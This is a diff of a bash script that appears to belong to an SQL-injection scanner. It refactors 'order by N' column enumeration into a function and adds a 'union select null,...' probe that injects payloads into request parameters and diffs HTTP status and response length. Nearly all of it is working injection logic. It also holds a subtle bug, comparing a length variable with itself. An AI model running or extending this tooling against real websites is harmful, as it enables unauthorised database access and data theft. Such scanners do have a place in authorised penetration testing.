@@ -47,11 +47,15 @@ orderbycheck()
 #need to check we have a valid orderby test string
 badparams=`echo "$outputstore" | replace "$encodedpayload" "1$quote+order+by+9659$end"`
 requester
+
+#status999=200
 status999=`echo $response | cut -d ":" -f 1`
 length999=`echo $response | cut -d ":" -f 2`
 
 badparams=`echo "$outputstore" | replace "$encodedpayload" "1$quote+order+by+1$end"`
 requester
+
+#status1=200
 status1=`echo $response | cut -d ":" -f 1`
 length1=`echo $response | cut -d ":" -f 2`
 ordlngthdiff=0
@@ -59,6 +63,27 @@ ordlngthdiff=0
 if [[ "$lendiff" -gt 4 || "$lendiff" -lt 4 ]] ; then
 	ordlngthdiff=1
 fi
+echo "Order by 1 got a $status1 response, order by 9659 got a $status999 response"
+}
+
+orderbyrequest()
+{
+count=1
+columns=150
+while [[ $count -lt $columns ]] ; do
+		badparams=`echo "$outputstore" | replace "$encodedpayload" "1$quote+order+by+$count$end"`
+		requester
+		statusX=`echo $response | cut -d ":" -f 1`
+		if [[ "$statusX" != "$status1" ]] ; then 
+			((colno=$count-1))
+			echo -e '\E[31;48m'"\033[1m[ORDER BY: $colno COL REQ:$K]\033[0m $request"
+			tput sgr0 # Reset attributes.
+			echo "[ORDER BY: $colno COL REQ:$K] $request" >> ./output/$safefilename$safelogname.txt;
+			success=1
+			break 
+		fi
+		let "count+=1"
+done
 }
 
 orderby()
@@ -96,7 +121,6 @@ orderbycheck
 
 #echo "$request"
 
-echo "Order by 1 got a $status1 response, order by 9659 got a $status999 response"
 
 #if you get two non-200 status's back, both 'order by x' requests failed; append an '--' on the end: 
 if [[ "$status1" != "200" && "$status1" == "$status999" ]] ; then
@@ -108,23 +132,8 @@ fi
 success=0
 if [[ "$status1" != "$status999" && "$status1" == "200" ]] ; then
 	# a difference between the two order by statements - we are good for order by column number enum
-	echo "Attempting to determine the number of columns"
-	count=1
-	columns=150
-	while [[ $count -lt $columns ]] ; do
-			badparams=`echo "$outputstore" | replace "$encodedpayload" "1$quote+order+by+$count$end"`
-			requester
-			statusX=`echo $response | cut -d ":" -f 1`
-			if [[ "$statusX" != "$status1" ]] ; then 
-				((colno=$count-1))
-				echo -e '\E[31;48m'"\033[1m[ORDER BY: $colno COL REQ:$K] $request\033[0m"
-				tput sgr0 # Reset attributes.
-				echo "[ORDER BY: $colno COL REQ:$K] $request" >> ./output/$safefilename$safelogname.txt;
-				success=1
-				break 
-			fi
-			let "count+=1"
-	done
+	echo "Using 'order by x' and response http status diffing to determine the number of columns"
+	orderbyrequest
 fi
 
 #if the above didnt work out,
@@ -134,28 +143,10 @@ if [[ "$success" == 0 ]] ; then
 		end="#"
 		orderbycheck
 	fi
-
 	if [[ "$status1" != "$status999" && "$status1" == "200" ]] ; then
 		# a difference between the two order by statements - we are good for order by column number enum
-		echo "Attempting to use 'order by x' to determine the number of columns"
-		count=1
-		columns=150
-		while [[ $count -lt $columns ]] ; do
-				echo -n "."
-				badparams=`echo "$outputstore" | replace "$encodedpayload" "1$quote+order+by+$count$end"`
-				requester
-				statusX=`echo $response | cut -d ":" -f 1`
-				if [[ "$statusX" != "$status1" ]] ; then
-					echo "" 
-					((colno=$count-1))
-					echo -e '\E[31;48m'"\033[1m[ORDER BY: $colno COL REQ:$K] $request\033[0m"
-					tput sgr0 # Reset attributes.
-					echo "[ORDER BY: $colno COL REQ:$K] $request" >> ./output/$safefilename$safelogname.txt;
-					success=1
-					break 
-				fi
-				let "count+=1"
-		done
+		echo "Using 'order by x' and response http status diffing to determine the number of columns"
+		orderbyrequest
 	fi
 fi
 
@@ -165,7 +156,7 @@ if [[ "$success" == 0 ]] ; then
 	orderbycheck
 	if [[ "$status1" == "200" && "$ordlngthdiff" == "1" ]] ; then
 		# a difference IN LENGTH between the two order by statements - we are good for order by column number enum
-		echo "Attempting to use 'order by x' to determine the number of columns"
+		echo "Using 'order by x' and response length diffing to determine the number of columns"
 		count=1
 		columns=150
 		while [[ $count -lt $columns ]] ; do
@@ -186,10 +177,70 @@ if [[ "$success" == 0 ]] ; then
 		done
 	fi
 fi
-
+#if one of the above order by did work then lets try a union select
+if [[ "$success" == 1 ]] ; then
+	unionselect
+fi
 
 }
 
+unionselect()
+{
+#we need to create a string like union select null,null,null,null with a 'null,' for the colno (number of columns from the order by x) 
+((nullcount=0))
+nullstring=""
+while [[ $nullcount -lt $colno ]] ; do
+	((nullcount=$nullcount+1))
+	if (($nullcount==$colno)) ; then 
+		nullstring=$nullstring"null"
+	else
+		nullstring=$nullstring"null,"
+	fi
+done
+
+#we create a nullstring similar to the above but with one extra null to use as a request that should fail
+((nullcount=0))
+nullwrongstring="null,"
+while [[ $nullcount -lt $colno ]] ; do
+	((nullcount=$nullcount+1))
+	if (($nullcount==$colno)) ; then 
+		nullwrongstring=$nullwrongstring"null"
+	else
+		nullwrongstring=$nullwrongstring"null,"
+	fi
+done
+
+badparams=`echo "$outputstore" | replace "$encodedpayload" "1$quote+union+select+$nullwrongstring$end"`
+#echo "DEBUG wrong $badparams"
+requester
+statusselN=`echo $response | cut -d ":" -f 1`
+lengthselN=`echo $response | cut -d ":" -f 2`
+
+badparams=`echo "$outputstore" | replace "$encodedpayload" "1$quote+union+select+$nullstring$end"`
+#echo "DEBUG right $badparams"
+requester
+statusselY=`echo $response | cut -d ":" -f 1`
+lengthselY=`echo $response | cut -d ":" -f 2`
+
+if [[ $statusselY != $statusselN || $lengthselN != $lengthselN ]] ; then
+	#echo "UNION SELECT looks good! $request"
+	echo -e '\E[31;48m'"\033[1m[UNION SELECT: $colno COL REQ:$K]\033[0m $request"
+	tput sgr0 # Reset attributes.
+	echo "[UNION SELECT: $colno COL REQ:$K] $request" >> ./output/$safefilename$safelogname.txt;
+	selectsuccess=1
+fi
+
+#if the union select worked, lets enumerate the data types
+#if [[ "$selectsuccess" == 1 ]] ; then
+#	unionselectout
+#fi
+
+}
+
+#unionselectout()
+#{
+#	echo "UNION SELECT OUTPUT!"
+#}
 
 #remove any residual files left lying about: 
 rm cleanscannerinputlist.txt 2>/dev/null
